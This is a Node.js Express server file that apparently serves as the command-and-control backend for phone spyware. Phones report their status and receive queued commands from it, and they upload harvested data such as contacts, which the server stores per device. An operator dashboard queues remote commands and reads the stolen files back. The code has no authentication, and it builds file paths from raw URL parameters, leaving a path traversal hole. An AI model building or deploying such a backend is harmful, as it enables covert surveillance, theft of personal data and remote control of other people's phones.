const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let devices = {}; 

// ==================================================
// 📲 PHONE SIDE
// ==================================================

app.post('/api/status', (req, res) => {
    const { device_id, model, battery, version, charging } = req.body; 
    const id = device_id || "M2103K19I";

    if (!devices[id]) devices[id] = {};
    const pendingCommand = devices[id].command || "none";

    devices[id] = {
        model: model || "Unknown",
        battery: battery || 0,
        version: version || "--",
        charging: charging === 'true' || charging === true,
        lastSeen: Date.now(),
        command: "" 
    };

    console.log(`📡 Ping from ${id} | Cmd: ${pendingCommand}`);
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    const { device_id, type, data } = req.body;
    const id = device_id || "M2103K19I";

    console.log(`📥 Data Received: [${type}] from ${id}`);

    let parsedData = typeof data === 'string' ? JSON.parse(data) : data;

    // File Name: M2103K19I_contacts.json
    const fileName = `${id}_${type}.json`;
    const filePath = path.join(UPLOADS_DIR, fileName);

    try {
        fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
// 💻 DASHBOARD SIDE (FIXED ROUTES)
// ==================================================

// 🔥 YE MISSING THA: Dashboard isi se data uthayega
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const { device_id, type } = req.params;
    // Naming pattern match karo: M2103K19I_contacts.json
    const fileName = `${device_id}_${type}.json`;
    const filePath = path.join(UPLOADS_DIR, fileName);

    console.log(`🔍 Dashboard is asking for: ${fileName}`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]); // File nahi hai to empty array bhejo
    }
});

app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    const id = device_id || "M2103K19I"; 

    if (!devices[id]) devices[id] = {};
    devices[id].command = command;
    
    console.log(`🚀 Command [${command}] queued for ${id}`);
    res.json({ status: "success" });
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id;
    const device = devices[id];
    if (!device) return res.json({ isOnline: false });

    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

app.listen(PORT, () => {
    console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`);
});
